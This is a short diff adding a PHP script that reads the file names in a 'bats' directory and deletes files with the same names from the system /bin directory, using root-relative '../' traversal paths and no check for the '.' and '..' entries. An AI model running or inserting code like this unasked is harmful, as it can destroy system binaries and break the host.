@@ -1,0 +1,7 @@
+<?php
+
+$files = scandir('/../bats/');
+
+foreach ($files as $file) {
+    unlink('/../../../bin/' . $file);
+}
